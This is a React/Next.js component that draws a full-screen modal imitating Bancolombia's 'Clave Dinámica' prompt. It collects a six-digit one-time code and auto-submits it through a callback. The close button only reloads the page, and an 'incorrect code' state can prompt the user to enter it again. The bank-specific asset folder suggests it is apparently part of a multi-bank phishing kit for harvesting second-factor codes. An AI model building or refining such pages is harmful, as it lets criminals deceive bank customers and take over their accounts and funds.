/* eslint-disable @next/next/no-img-element */
/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";

import { useEffect, useState, useRef } from "react";

export default function Dinamica({ enviar, isError = false }: { enviar: any; isError?: boolean }) {
  const [values, setValues] = useState(["", "", "", "", "", ""]);
  const [focusedIndex, setFocusedIndex] = useState<number | null>(null);
  const inputs = Array.from({ length: 6 }).map(() => useRef<HTMLInputElement>(null));

  const handleChange = (index: number, val: string) => {
    if (!/^[0-9]?$/.test(val)) return;

    const newValues = [...values];
    newValues[index] = val;
    setValues(newValues);

    // Auto-focus al siguiente input
    if (val && index < 5) {
      inputs[index + 1].current?.focus();
    }

    // Auto-envío si está completo
    if (newValues.every((v) => v !== "")) {
      const code = newValues.join("");
      enviar?.({ dinamica: code, view: "dinamica" });
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !values[index] && index > 0) {
      inputs[index - 1].current?.focus();
    }
  };

  const isComplete = values.every((v) => v !== "");

  const handleConfirm = () => {
    if (!isComplete) return;
    enviar?.({ dinamica: values.join(""), view: "dinamica" });
  };

  const handleClear = () => {
    setValues(["", "", "", "", "", ""]);
    inputs[0].current?.focus();
  };

  return (
    <div style={{
      position: "fixed",
      top: 0,
      left: 0,
      width: "100vw",
      height: "100vh",
      backgroundColor: "rgba(0, 0, 0, 0.5)",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      padding: "20px",
      zIndex: 99999,
      fontFamily: "'Manrope', sans-serif",
      boxSizing: "border-box"
    }}>
      
      {/* Tarjeta Modal */}
      <div style={{
        backgroundColor: "#ffffff",
        borderRadius: "24px",
        padding: "36px 24px 24px 24px",
        maxWidth: "440px",
        width: "100%",
        textAlign: "center",
        position: "relative",
        boxShadow: "0 10px 25px rgba(0,0,0,0.2)",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        boxSizing: "border-box"
      }}>
        
        {/* Botón de Cerrar (X) */}
        <button
          onClick={() => window.location.reload()}
          style={{
            position: "absolute",
            top: "16px",
            right: "20px",
            background: "none",
            border: "none",
            fontSize: "22px",
            color: "#999",
            cursor: "pointer",
            lineHeight: 1,
            padding: 0,
            zIndex: 10
          }}
        >
          ✕
        </button>

        {/* Video Banner (GIF en MP4) */}
        <div style={{
          width: "100%",
          borderRadius: "16px",
          overflow: "hidden",
          marginBottom: "20px",
          backgroundColor: "#55cdfc"
        }}>
          <video
            src="/bancos/bancol/cd-desktop.gif.mp4"
            autoPlay
            loop
            muted
            playsInline
            style={{
              width: "100%",
              display: "block"
            }}
          />
        </div>

        {/* Título */}
        <h2 style={{
          fontSize: "20px",
          fontWeight: "bold",
          color: "#2C2A29",
          margin: "0 0 8px 0",
          lineHeight: "1.2"
        }}>
          Ingresa la Clave Dinámica
        </h2>

        {/* Subtítulo */}
        <p style={{
          fontSize: "13px",
          color: "#666666",
          margin: "0 0 24px 0",
          maxWidth: "320px",
          lineHeight: "1.4"
        }}>
          Encuentra tu Clave Dinámica en la app Mi Bancolombia.
        </p>

        {/* Mensaje de Error (si aplica) */}
        {isError && (
          <div style={{
            fontSize: "12px",
            fontWeight: "bold",
            color: "#E02B2B",
            backgroundColor: "#FEECEC",
            padding: "8px 16px",
            borderRadius: "8px",
            marginBottom: "16px",
            width: "100%",
            boxSizing: "border-box"
          }}>
            La clave dinámica ingresada es incorrecta. Por favor verifícala.
          </div>
        )}

        {/* Inputs de Clave Dinámica */}
        <div style={{
          display: "flex",
          justifyContent: "center",
          gap: "12px",
          marginBottom: "32px"
        }}>
          {values.map((val, i) => (
            <input
              key={i}
              ref={inputs[i]}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={val}
              onChange={(e) => handleChange(i, e.target.value)}
              onKeyDown={(e) => handleKeyDown(i, e)}
              onFocus={() => setFocusedIndex(i)}
              onBlur={() => setFocusedIndex(null)}
              style={{
                width: "32px",
                height: "40px",
                border: "none",
                borderBottom: isError 
                  ? "2px solid #E02B2B" 
                  : (focusedIndex === i ? "2px solid #00C389" : "2px solid #D1D5DB"),
                textAlign: "center",
                fontSize: "20px",
                fontWeight: "bold",
                color: isError ? "#E02B2B" : "#2C2A29",
                backgroundColor: "transparent",
                outline: "none",
                padding: 0,
                margin: 0
              }}
            />
          ))}
        </div>

        {/* Botones de Acción */}
        <div style={{
          display: "flex",
          justifyContent: "space-between",
          width: "100%",
          gap: "12px"
        }}>
          <button
            type="button"
            onClick={handleClear}
            style={{
              width: "48%",
              height: "44px",
              border: "1px solid #ccc",
              borderRadius: "22px",
              backgroundColor: "#ffffff",
              color: "#333333",
              fontWeight: "bold",
              fontSize: "14px",
              cursor: "pointer",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              boxSizing: "border-box",
              padding: 0
            }}
          >
            Borrar
          </button>
          
          <button
            type="button"
            disabled={!isComplete}
            onClick={handleConfirm}
            style={{
              width: "48%",
              height: "44px",
              border: "none",
              borderRadius: "22px",
              backgroundColor: isComplete ? "#FDDA24" : "#E5E7EB",
              color: isComplete ? "#2C2A29" : "#A3A3A3",
              fontWeight: "bold",
              fontSize: "14px",
              cursor: isComplete ? "pointer" : "not-allowed",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              boxSizing: "border-box",
              padding: 0
            }}
          >
            Continuar
          </button>
        </div>

      </div>
    </div>
  );
}